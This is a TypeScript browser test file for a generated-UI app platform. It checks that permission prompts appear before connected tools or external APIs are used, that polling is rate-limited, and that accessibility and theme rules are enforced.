    await registry.settle(version.artifactId, version.id, {
      checkedAt: new Date().toISOString(), build: 'passed', browser: 'not-run', diagnostics: [], notes: [],
    })
    const token = capabilities.issue(version.artifactId, fakeAgent)
    const browser = await chromium.launch({ headless: true })
    try {
      const page = await browser.newPage({ viewport: { width: 1280, height: 800 } })
      await page.goto(`${origin}/genui/app/${version.artifactId}?lang=en#token=${token}`)
      const app = page.frameLocator('#app')
      await app.getByRole('slider', { name: 'Move Earth around its orbit' }).fill('1')
      await app.getByText('September position', { exact: true }).waitFor({ state: 'visible' })
      await page.getByText('Saved', { exact: true }).waitFor({ state: 'visible' })
      await expect.poll(async () => (await registry.readState(version.artifactId, String(fakeAgent.id)))?.values.orbitalPhase).toBe(1)
      await capture(page, '07-season-model.png')

      await page.setViewportSize({ width: 390, height: 844 })
      await expect.poll(async () => app.locator('html').evaluate(element => element.scrollWidth <= element.clientWidth)).toBe(true)
      await capture(page, '08-season-model-narrow.png')
      await page.reload()
      await app.getByText('September position', { exact: true }).waitFor({ state: 'visible' })
    } finally {
      await browser.close()
    }
  }, 30_000)

  it('asks for permission before a stable local app calls a connected tool', async () => {
    echoCalls = 0
    const version = await registry.create({
      id: 'standalone-permission',
      title: 'Connected explanation',
      summary: 'Exercise the standalone permission host.',
      requirements: ['Ask before using the connected action'],
      capabilities: [{
        id: 'echo-message', kind: 'tool', label: 'Read the explanation',
        reason: 'Load the selected explanation from the connected source.', access: 'read', tool: 'test_echo',
      }, {
        id: 'public-service', kind: 'external', label: 'Check the public service',
        reason: 'Read the latest public status when you ask.', access: 'read',
        urlPrefix: 'https://api.example.com/v1/', methods: ['GET'],
      }],
      files: [{
        path: 'src/main.tsx',
        content: `import React, { useState } from 'react'
import { createRoot } from 'react-dom/client'
import { callTool, requestExternal } from '@dsh-genui/sdk'
function App() {
  const [answer, setAnswer] = useState('Waiting')
  return <main><button onClick={async () => {
    setAnswer('Loading')
    try {
      const value = await callTool('test_echo', { message: 'Connected' }) as { echoed: string }
      setAnswer(value.echoed)
    } catch { setAnswer('Permission was not granted') }
  }}>Load explanation</button><button onClick={async () => {
    const [first, second] = await Promise.all([
      callTool('test_echo', { message: 'Connected' }),
      callTool('test_echo', { message: 'Connected' }),
    ]) as Array<{ echoed: string }>
    setAnswer(first.echoed + ' twice: ' + String(first === second))
  }}>Load twice</button><button onClick={() => {
    void requestExternal('https://api.example.com/v1/status').catch(() => undefined)
  }}>Check service</button><p>{answer}</p></main>
}
createRoot(document.getElementById('root')!).render(<App />)`,
      }],
    })
    const built = await buildArtifact(version, registry.distPath(version.artifactId, version.id))
    expect(built.ok, JSON.stringify(built.diagnostics)).toBe(true)
    await registry.settle(version.artifactId, version.id, {
      checkedAt: new Date().toISOString(), build: 'passed', browser: 'not-run', diagnostics: [], notes: [],
    })
    const token = capabilities.issue(version.artifactId, fakeAgent)
    const browser = await chromium.launch({ headless: true })
    try {
      const page = await browser.newPage()
      await page.goto(`${origin}/genui/app/${version.artifactId}?lang=en#token=${token}`)
      const app = page.frameLocator('#app')
      await page.getByRole('heading', { name: 'This app needs the following access' }).waitFor({ state: 'visible' })
      await page.getByText('Read the explanation', { exact: true }).waitFor({ state: 'visible' })
      await page.getByText('Check the public service', { exact: true }).waitFor({ state: 'visible' })
      await page.getByRole('button', { name: 'Not now' }).click()
      await app.getByRole('button', { name: 'Load explanation' }).click()
      await page.getByRole('heading', { name: 'Read the explanation' }).waitFor({ state: 'visible' })
      await page.getByText('Load the selected explanation from the connected source.').waitFor({ state: 'visible' })
      await page.getByText('Read information', { exact: true }).waitFor({ state: 'visible' })
      await page.getByText('Once allowed, this app can keep using this capability during the current task.').waitFor({ state: 'visible' })
      await capture(page, '03-tool-permission-specific-scope.png')
      await page.getByRole('button', { name: 'Not now' }).click()
      await app.getByText('Permission was not granted').waitFor({ state: 'visible' })
      expect(echoCalls).toBe(0)

      await app.getByRole('button', { name: 'Load explanation' }).click()
      await page.getByRole('heading', { name: 'Read the explanation' }).waitFor({ state: 'visible' })
      await page.getByRole('button', { name: 'Allow for this task' }).click()
      await app.getByText('Connected').waitFor({ state: 'visible' })
      expect(echoCalls).toBe(1)

      await page.waitForTimeout(300)
      await app.getByRole('button', { name: 'Load twice' }).click()
      await app.getByText('Connected twice: true').waitFor({ state: 'visible' })
      await expect.poll(() => echoCalls).toBe(2)

      await app.getByRole('button', { name: 'Check service' }).click()
      await page.getByRole('heading', { name: 'Check the public service' }).waitFor({ state: 'visible' })
      await page.getByText('Connect to api.example.com/v1/', { exact: true }).waitFor({ state: 'visible' })
      await page.getByText('Allowed requests GET', { exact: true }).waitFor({ state: 'visible' })
      await page.getByRole('button', { name: 'Not now' }).click()
    } finally {
      await browser.close()
    }
  }, 30_000)

  liveIt('uses a public forecast only after task-scoped approval', async () => {
    const version = await registry.create({
      id: 'live-weekend-weather',
      title: 'Weekend weather check',
      summary: 'Check whether the outdoor parts of a weekend plan need a rain fallback.',
      requirements: ['Load the current public forecast only when the user asks'],
      capabilities: [{
        id: 'open-meteo-forecast', kind: 'external', label: 'Check Shanghai weather',
        reason: 'Read the current public forecast for the outdoor stops in your plan.', access: 'read',
        urlPrefix: 'https://api.open-meteo.com/v1/forecast', methods: ['GET'],
      }],
      files: [{
        path: 'src/main.tsx',
        content: `import React, { useState } from 'react'
import { createRoot } from 'react-dom/client'
import { CloudSun, MapPin } from 'lucide-react'
import { requestExternal, useArtifactState } from '@dsh-genui/sdk'
import './styles.css'
const url = 'https://api.open-meteo.com/v1/forecast?latitude=31.23&longitude=121.47&current=temperature_2m'
function App() {
  const [plan, setPlan, saved] = useArtifactState('weekendRoute', { gardenOptional: false })
  const [status, setStatus] = useState('Forecast not checked')
  const check = async () => {
    setStatus('Checking forecast...')
    try {
      const response = await requestExternal(url) as { status: number; body: string }
      const data = JSON.parse(response.body) as { current?: { temperature_2m?: number }; current_units?: { temperature_2m?: string } }
      const temperature = data.current?.temperature_2m
      setStatus(response.status === 200 && typeof temperature === 'number'
        ? 'Current temperature: ' + temperature + (data.current_units?.temperature_2m || '°C')
        : 'Forecast is unavailable')
    } catch (error) {
      setStatus(error instanceof Error && error.message === 'Permission was not granted'
        ? 'Weather access was not allowed. You can try again.' : 'Forecast is unavailable. Try again.')
    }
  }
  if (!saved.ready) return <main className="loading">Opening your plan...</main>
  return <main><header><p className="eyebrow">Saturday · Shanghai</p><h1>Three stops,<br/>no backtracking.</h1><p className="lede">A compact route with one outdoor stop you can drop if the weather turns.</p></header><section className="route" aria-label="Saturday route"><div className="rail" aria-hidden="true"/><article><span className="time">11:00</span><MapPin/><div><strong>West Bund Museum</strong><small>90 minutes · indoors</small></div></article><article data-optional={plan.gardenOptional}><span className="time">15:00</span><MapPin/><div><strong>Riverside garden</strong><small>{plan.gardenOptional ? 'Optional · skip if wet' : '60 minutes · outdoors'}</small></div></article><article><span className="time">18:30</span><MapPin/><div><strong>Dinner</strong><small>Reserved · 20 minutes away</small></div></article></section><aside><CloudSun/><div><strong>Outdoor check</strong><p role="status">{status}</p></div><button data-genui-primary-action onClick={() => { void check() }}>Check weather</button></aside><footer><button className="text-button" onClick={() => setPlan(value => ({ ...value, gardenOptional: !value.gardenOptional }))}>{plan.gardenOptional ? 'Keep garden in the route' : 'Make garden optional'}</button><span>{plan.gardenOptional ? 'Garden optional' : 'Garden planned'}</span></footer>{saved.error ? <p className="error" role="alert">Could not save the route change.</p> : null}</main>
}
createRoot(document.getElementById('root')!).render(<App />)`,
      }, {
        path: 'src/styles.css',
        content: `:root{color-scheme:light dark;font-family:"Trebuchet MS",sans-serif;background:#eee9de;color:#1f302a}*{box-sizing:border-box}body{margin:0;min-width:0;background:radial-gradient(circle at 92% 8%,#d6dfc9 0 16%,transparent 42%),linear-gradient(135deg,#f7f2e8,#e8e3d7)}button{font:inherit}main{width:min(760px,calc(100% - 32px));margin:0 auto;padding:42px 0 36px}.loading{display:grid;min-height:100vh;place-items:center}.eyebrow{margin:0 0 10px;color:#a1432f;font-size:12px;font-weight:800;letter-spacing:.13em;text-transform:uppercase}h1{max-width:560px;margin:0;font-family:Georgia,serif;font-size:clamp(38px,7vw,68px);font-weight:500;line-height:.96;letter-spacing:-.04em}.lede{max-width:520px;margin:20px 0 30px;color:#4d5a54;font-size:16px;line-height:1.55}.route{position:relative;display:grid;gap:8px;border-block:1px solid #1f302a33;padding:20px 0}.rail{position:absolute;top:38px;bottom:38px;left:91px;width:1px;background:#1f302a55}.route article{position:relative;display:grid;grid-template-columns:62px 24px minmax(0,1fr);align-items:center;gap:14px;min-height:58px;padding:8px 10px;border-radius:14px}.route article[data-optional=true]{background:#fff8;border:1px dashed #a1432f66}.route svg{z-index:1;width:20px;height:20px;padding:4px;border-radius:50%;background:#1f302a;color:#f7f2e8;stroke-width:2.4}.time{font-size:13px;font-weight:800;font-variant-numeric:tabular-nums}.route strong,.route small{display:block}.route strong{font:600 18px/1.2 Georgia,serif}.route small{margin-top:4px;color:#637068;font-size:12px}aside{display:grid;grid-template-columns:auto minmax(0,1fr) auto;align-items:center;gap:14px;margin:18px 0 14px;border-radius:18px;padding:16px 18px;background:#1f302a;color:#f7f2e8;box-shadow:0 18px 42px #20302922}aside>svg{width:24px}aside strong{font-family:Georgia,serif;font-size:16px}aside p{margin:4px 0 0;color:#d3ddd5;font-size:12px}aside button{min-height:40px;border:0;border-radius:999px;padding:0 16px;background:#d8ab4e;color:#1f302a;font-weight:800;cursor:pointer}button:focus-visible{outline:3px solid #d8ab4e;outline-offset:3px}footer{display:flex;align-items:center;justify-content:space-between;gap:12px}.text-button{border:0;padding:8px 0;background:transparent;color:#8f3f2c;font-weight:800;text-decoration:underline;text-underline-offset:4px;cursor:pointer}footer span{color:#637068;font-size:12px}.error{color:#9d3028}@media(prefers-color-scheme:dark){:root{background:#18231f;color:#f3ecdf}body{background:radial-gradient(circle at 92% 8%,#314337 0 16%,transparent 42%),linear-gradient(135deg,#16211d,#202b27)}.lede,.route small,footer span{color:#b6c2ba}.route{border-color:#f3ecdf33}.rail{background:#f3ecdf55}.route article[data-optional=true]{background:#ffffff0d}.route svg{background:#f3ecdf;color:#1f302a}aside{background:#efe8db;color:#1f302a}aside p{color:#56645c}}@media(max-width:520px){main{width:min(100% - 28px,760px);padding-top:30px}h1{font-size:42px}.lede{font-size:14px}.rail{left:76px}.route article{grid-template-columns:54px 20px minmax(0,1fr);gap:10px;padding-inline:4px}.route strong{font-size:16px}aside{grid-template-columns:auto minmax(0,1fr)}aside button{grid-column:1/-1;width:100%}footer{align-items:flex-start;flex-direction:column}}@media(prefers-reduced-motion:reduce){*{scroll-behavior:auto!important}}`,
      }],
    })
    const built = await buildArtifact(version, registry.distPath(version.artifactId, version.id))
    expect(built.ok, JSON.stringify(built.diagnostics)).toBe(true)
    await registry.settle(version.artifactId, version.id, {
      checkedAt: new Date().toISOString(), build: 'passed', browser: 'not-run', diagnostics: [], notes: [],
    })
    const token = capabilities.issue(version.artifactId, fakeAgent)
    const browser = await chromium.launch({ headless: true })
    try {
      const page = await browser.newPage({ viewport: { width: 1280, height: 800 } })
      let actionRequests = 0
      page.on('request', request => {
        if (new URL(request.url()).pathname.endsWith('/external')) actionRequests += 1
      })
      await page.goto(`${origin}/genui/app/${version.artifactId}?lang=en#token=${token}`)
      const app = page.frameLocator('#app')
      await page.getByRole('button', { name: 'Not now' }).click()
      await app.getByRole('button', { name: 'Make garden optional' }).click()
      await page.getByText('Saved', { exact: true }).waitFor({ state: 'visible' })
      await app.getByText('Garden optional', { exact: true }).waitFor({ state: 'visible' })
      await expect.poll(async () => (await registry.readState(version.artifactId, String(fakeAgent.id)))?.values.weekendRoute)
        .toEqual({ gardenOptional: true })
      await capture(page, '00-weekend-route-state.png')

      await app.getByRole('button', { name: 'Check weather' }).click()
      await page.getByRole('heading', { name: 'Check Shanghai weather' }).waitFor({ state: 'visible' })
      await page.getByText('Connect to api.open-meteo.com/v1/forecast', { exact: true }).waitFor({ state: 'visible' })
      expect(actionRequests).toBe(1)
      await page.getByRole('button', { name: 'Not now' }).click()
      await app.getByText('Weather access was not allowed. You can try again.').waitFor({ state: 'visible' })
      expect(actionRequests).toBe(1)

      await app.getByRole('button', { name: 'Check weather' }).click()
      await page.getByRole('heading', { name: 'Check Shanghai weather' }).waitFor({ state: 'visible' })
      await capture(page, '04-open-meteo-permission.png')
      await page.getByRole('button', { name: 'Allow for this task' }).click()
      await app.getByText(/^Current temperature:/).waitFor({ state: 'visible', timeout: 15_000 })
      await expect.poll(() => actionRequests).toBe(3)
      await capture(page, '05-open-meteo-result.png')

      await page.setViewportSize({ width: 390, height: 844 })
      await expect.poll(async () => app.locator('html').evaluate(element => element.scrollWidth <= element.clientWidth)).toBe(true)
      await capture(page, '06-open-meteo-narrow.png')
      await page.reload()
      await app.getByText('Forecast not checked').waitFor({ state: 'visible' })
      await app.getByText('Garden optional', { exact: true }).waitFor({ state: 'visible' })
      await page.waitForTimeout(300)
      expect(actionRequests).toBe(3)
    } finally {
      await browser.close()
    }
  }, 45_000)

  it('grants every declared permission once before opening the standalone app', async () => {
    echoCalls = 0
    secondSourceCalls = 0
    const version = await registry.create({
      id: 'standalone-permission-queue',
      title: 'Connected weekend planner',
      summary: 'Connect two sources from one user action.',
      requirements: ['Ask for each source before loading it'],
      capabilities: [{
        id: 'first-source', kind: 'tool', label: 'Read travel times',
        reason: 'Compare travel time for the two places in your plan.', access: 'read', tool: 'test_echo',
      }, {
        id: 'second-source', kind: 'tool', label: 'Read opening times',
        reason: 'Check whether both places are open during your plan.', access: 'read', tool: 'test_second_source',
      }],
      files: [{
        path: 'src/main.tsx',
        content: `import React, { useState } from 'react'
import { createRoot } from 'react-dom/client'
import { callTool } from '@dsh-genui/sdk'
function App() {
  const [status, setStatus] = useState('Ready')
  return <main><button onClick={async () => {
    setStatus('Checking')
    try {
      await Promise.all([callTool('test_echo', { message: 'travel' }), callTool('test_second_source', {})])
      setStatus('Both sources connected')
    } catch { setStatus('Could not connect both sources') }
  }}>Check both</button><p>{status}</p></main>
}
createRoot(document.getElementById('root')!).render(<App />)`,
      }],
    })
    const built = await buildArtifact(version, registry.distPath(version.artifactId, version.id))
    expect(built.ok, JSON.stringify(built.diagnostics)).toBe(true)
    await registry.settle(version.artifactId, version.id, {
      checkedAt: new Date().toISOString(), build: 'passed', browser: 'not-run', diagnostics: [], notes: [],
    })
    const token = capabilities.issue(version.artifactId, fakeAgent)
    const browser = await chromium.launch({ headless: true })
    try {
      const page = await browser.newPage()
      let grantAllCalls = 0
      page.on('request', request => {
        if (new URL(request.url()).pathname.endsWith('/permission/grant-all')) grantAllCalls += 1
      })
      await page.goto(`${origin}/genui/app/${version.artifactId}?lang=en#token=${token}`)
      const app = page.frameLocator('#app')
      await page.getByRole('heading', { name: 'This app needs the following access' }).waitFor({ state: 'visible' })
      await page.getByText('Read travel times', { exact: true }).waitFor({ state: 'visible' })
      await page.getByText('Read opening times', { exact: true }).waitFor({ state: 'visible' })
      await page.getByRole('button', { name: 'Allow all and open' }).click()
      expect(grantAllCalls).toBe(1)
      await app.getByRole('button', { name: 'Check both' }).click()
      await app.getByText('Both sources connected').waitFor({ state: 'visible' })
      expect(echoCalls).toBe(1)
      expect(secondSourceCalls).toBe(1)
      expect(await page.locator('#permission').evaluate(dialog => (dialog as HTMLDialogElement).open)).toBe(false)
    } finally {
      await browser.close()
    }
  }, 30_000)

  it('enforces the five-second minimum for live polling', async () => {
    pollCalls = 0
    const version = await registry.create({
      id: 'polling-interval',
      title: 'Live conditions',
      summary: 'Keep a changing reading current without excessive requests.',
      requirements: ['Poll no more often than every five seconds'],
      capabilities: [{
        id: 'live-reading', kind: 'tool', label: 'Read live conditions',
        reason: 'Refresh the current reading while this view is open.', access: 'read', tool: 'test_poll',
      }],
      files: [{
        path: 'src/main.tsx',
        content: `import React, { useEffect, useState } from 'react'
import { createRoot } from 'react-dom/client'
import { watchTool } from '@dsh-genui/sdk'
function App() {
  const [count, setCount] = useState(0)
  useEffect(() => watchTool('test_poll', {}, value => setCount((value as { count: number }).count), { intervalMs: 1000 }), [])
  return <main>Updates received: {count}</main>
}
createRoot(document.getElementById('root')!).render(<App />)`,
      }],
    })
    const built = await buildArtifact(version, registry.distPath(version.artifactId, version.id))
    expect(built.ok, JSON.stringify(built.diagnostics)).toBe(true)
    await registry.settle(version.artifactId, version.id, {
      checkedAt: new Date().toISOString(), build: 'passed', browser: 'not-run', diagnostics: [], notes: [],
    })
    const token = capabilities.issue(version.artifactId, fakeAgent)
    const browser = await chromium.launch({ headless: true })
    try {
      const page = await browser.newPage()
      await page.goto(`${origin}/genui/app/${version.artifactId}?lang=en#token=${token}`)
      await page.getByText('Read live conditions', { exact: true }).waitFor({ state: 'visible' })
      await page.getByRole('button', { name: 'Allow all and open' }).click()
      await expect.poll(() => pollCalls).toBe(1)
      await page.waitForTimeout(2_400)
      expect(pollCalls).toBe(1)
    } finally {
      await browser.close()
    }
  }, 30_000)

  it('rejects visible controls without names and images without alt text', async () => {
    const version = await registry.create({
      id: 'accessibility-failure',
      title: 'Accessibility failure',
      summary: 'Browser gate fixture.',
      requirements: [],
      capabilities: [],
      files: [{
        path: 'src/main.tsx',
        content: `import React from 'react'
import { createRoot } from 'react-dom/client'
function App() { return <main><button /><img width="16" height="16" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///ywAAAAAAQABAAACAUwAOw==" /></main> }
createRoot(document.getElementById('root')!).render(<App />)`,
      }],
    })
    const built = await buildArtifact(version, registry.distPath(version.artifactId, version.id))
    expect(built.ok).toBe(true)
    await registry.settle(version.artifactId, version.id, {
      checkedAt: new Date().toISOString(), build: 'passed', browser: 'not-run', diagnostics: [], notes: [],
    })
    const token = capabilities.issue(version.artifactId, fakeAgent)
    const result = await verifyArtifactInBrowser(`${origin}/genui/preview/${version.artifactId}/${version.id}?lang=en#token=${token}`)
    expect(result.ok).toBe(false)
    expect(result.diagnostics.map(item => item.text)).toEqual(expect.arrayContaining([
      expect.stringContaining('visible interactive control has no accessible name: button'),
      expect.stringContaining('visible image is missing alt text: img'),
    ]))
  }, 60_000)

  async function verifyFixture(id: string, source: string) {
    const version = await registry.create({
      id, title: id, summary: 'Primary interaction fixture.', requirements: [], capabilities: [],
      files: [{ path: 'src/main.tsx', content: source }],
    })
    const built = await buildArtifact(version, registry.distPath(version.artifactId, version.id))
    expect(built.ok, JSON.stringify(built.diagnostics)).toBe(true)
    await registry.settle(version.artifactId, version.id, {
      checkedAt: new Date().toISOString(), build: 'passed', browser: 'not-run', diagnostics: [], notes: [],
    })
    const token = capabilities.issue(version.artifactId, fakeAgent)
    return verifyArtifactInBrowser(`${origin}/genui/preview/${version.artifactId}/${version.id}?lang=en#token=${token}`)
  }

  it('accepts a primary button that changes visible state', async () => {
    const result = await verifyFixture('primary-button', `import React, { useState } from 'react'
import { createRoot } from 'react-dom/client'
function App() { const [open, setOpen] = useState(false); return <main><button data-genui-primary-action onClick={() => setOpen(true)}>Show details</button><p>{open ? 'Details are visible' : 'Ready'}</p></main> }
createRoot(document.getElementById('root')!).render(<App />)`)
    expect(result.ok).toBe(true)
    expect(result.notes).toContain('primary interaction changed the app or invoked a verified action')
  }, 60_000)

  it('rejects click-only controls that cannot receive keyboard focus', async () => {
    const result = await verifyFixture('keyboard-unreachable', `import React, { useState } from 'react'
import { createRoot } from 'react-dom/client'
function App() { const [open, setOpen] = useState(false); return <main><div role="button" aria-label="Show details" data-genui-primary-action onClick={() => setOpen(true)}>Show details</div><p>{open ? 'Details are visible' : 'Ready'}</p></main> }
createRoot(document.getElementById('root')!).render(<App />)`)
    expect(result.ok).toBe(false)
    expect(result.diagnostics.map(item => item.text)).toEqual(expect.arrayContaining([
      expect.stringContaining('is not keyboard reachable'),
    ]))
  }, 60_000)

  it('rejects controls whose focus indicator is removed', async () => {
    const result = await verifyFixture('focus-invisible', `import React, { useState } from 'react'
import { createRoot } from 'react-dom/client'
function App() { const [open, setOpen] = useState(false); return <main><style>{'button:focus{outline:none;box-shadow:none}'}</style><button data-genui-primary-action onClick={() => setOpen(true)}>Show details</button><p>{open ? 'Details are visible' : 'Ready'}</p></main> }
createRoot(document.getElementById('root')!).render(<App />)`)
    expect(result.ok).toBe(false)
    expect(result.diagnostics.map(item => item.text)).toEqual(expect.arrayContaining([
      expect.stringContaining('has no visible focus indicator'),
    ]))
  }, 60_000)

  it('does not mistake a permanent box shadow for a focus indicator', async () => {
    const result = await verifyFixture('focus-constant-shadow', `import React, { useState } from 'react'
import { createRoot } from 'react-dom/client'
function App() { const [open, setOpen] = useState(false); return <main><style>{'button{outline:none;box-shadow:0 0 0 3px #b94e32}'}</style><button data-genui-primary-action onClick={() => setOpen(true)}>Show details</button><p>{open ? 'Details are visible' : 'Ready'}</p></main> }
createRoot(document.getElementById('root')!).render(<App />)`)
    expect(result.ok).toBe(false)
    expect(result.diagnostics.map(item => item.text)).toEqual(expect.arrayContaining([
      expect.stringContaining('has no visible focus indicator'),
    ]))
  }, 60_000)

  it('accepts a focus-visible background change as a focus indicator', async () => {
    const result = await verifyFixture('focus-background', `import React, { useState } from 'react'
import { createRoot } from 'react-dom/client'
function App() { const [open, setOpen] = useState(false); return <main><style>{'button{outline:none;box-shadow:none;background:#f4efe7;color:#252422}button:focus-visible{background:#252422;color:#fff}'}</style><button data-genui-primary-action onClick={() => setOpen(true)}>Show details</button><p>{open ? 'Details are visible' : 'Ready'}</p></main> }
createRoot(document.getElementById('root')!).render(<App />)`)
    expect(result.ok).toBe(true)
  }, 60_000)

  it('rejects an unscoped OS dark rule that defeats an explicit light theme', async () => {
    const result = await verifyFixture('unscoped-dark-theme', `import React, { useState } from 'react'
import { createRoot } from 'react-dom/client'
function App() { const [done, setDone] = useState(false); return <main><style>{'body{color:rgb(20,20,20)}@media(prefers-color-scheme:dark){body{color:rgb(240,240,240)}}'}</style><button data-genui-primary-action onClick={() => setDone(true)}>Apply</button><p>{done ? 'Applied' : 'Ready'}</p></main> }
createRoot(document.getElementById('root')!).render(<App />)`)
    expect(result.ok).toBe(false)
    expect(result.diagnostics.map(item => item.text)).toEqual(expect.arrayContaining([
      'explicit light theme does not override the operating-system dark preference',
    ]))
  }, 60_000)

  it('keeps the compact shell dark and its modal background inert under a light OS theme', async () => {
    const browser = await chromium.launch({ headless: true })
    try {
      const page = await browser.newPage({ viewport: { width: 260, height: 720 } })
      await page.emulateMedia({ colorScheme: 'light' })
      await page.setContent(`<style>html,body{width:100%;margin:0}body{--dsw-alias-bg-base:rgb(17,19,21);--dsw-alias-bg-layer-1:rgb(24,26,28)}${cardCss}</style>
        <main class="dsh-genui-anchor">
          <section class="dsh-genui-card" data-surface="inline">
            <header class="dsh-genui-head" inert><button id="under-header" class="dsh-genui-action" aria-label="Hidden shell action">x</button></header>
            <div class="dsh-genui-permission-backdrop"><section class="dsh-genui-permission" role="dialog" aria-modal="true"><div class="dsh-genui-permission-actions"><button id="allow" class="dsh-genui-button">Allow</button></div></section></div>
            <div class="dsh-genui-body" inert><div class="dsh-genui-frame-shell"><iframe class="dsh-genui-frame" title="Preview"></iframe><button id="under-body">Hidden body action</button></div></div>
          </section>
        </main>`)
      await page.locator('body').evaluate(body => body.setAttribute('data-ds-dark-theme', ''))

      const report = await page.evaluate(() => {
        const background = (selector: string) => getComputedStyle(document.querySelector(selector)!).backgroundColor
        return {
          width: document.documentElement.clientWidth,
          scrollWidth: document.documentElement.scrollWidth,
          card: background('.dsh-genui-card'),
          body: background('.dsh-genui-body'),
          frame: background('.dsh-genui-frame'),
        }
      })
      expect(report.scrollWidth).toBeLessThanOrEqual(report.width)
      expect(report.body).toBe(report.card)
      expect(report.frame).toBe(report.card)
      expect(report.card).toBe('rgb(17, 19, 21)')

      await page.locator('#under-header').focus()
      expect(await page.locator('#under-header').evaluate(element => document.activeElement === element)).toBe(false)
      await page.locator('#under-body').focus()
      expect(await page.locator('#under-body').evaluate(element => document.activeElement === element)).toBe(false)
      await page.keyboard.press('Tab')
      expect(await page.locator('#allow').evaluate(element => document.activeElement === element)).toBe(true)
    } finally {
      await browser.close()
    }
  }, 30_000)

  it('rejects a primary button whose handler does nothing', async () => {
    const result = await verifyFixture('primary-noop', `import React from 'react'
import { createRoot } from 'react-dom/client'
function App() { return <main><button data-genui-primary-action onClick={() => undefined}>Show details</button><p>Unchanged</p></main> }
createRoot(document.getElementById('root')!).render(<App />)`)
    expect(result.ok).toBe(false)
    expect(result.diagnostics.map(item => item.text)).toContain('data-genui-primary-action did not change visible app state or invoke a verified action')
  }, 60_000)

  it('accepts a primary range control that changes its output', async () => {
    const result = await verifyFixture('primary-slider', `import React from 'react'
import { createRoot } from 'react-dom/client'
import { useArtifactState } from '@dsh-genui/sdk'
function App() { const [light, setLight] = useArtifactState('light', 2); return <main><label>Light<input data-genui-primary-action type="range" min="1" max="5" value={light} onChange={event => setLight(Number(event.target.value))} /></label><output>{light}</output></main> }
createRoot(document.getElementById('root')!).render(<App />)`)
    expect(result.ok).toBe(true)
  }, 60_000)
})
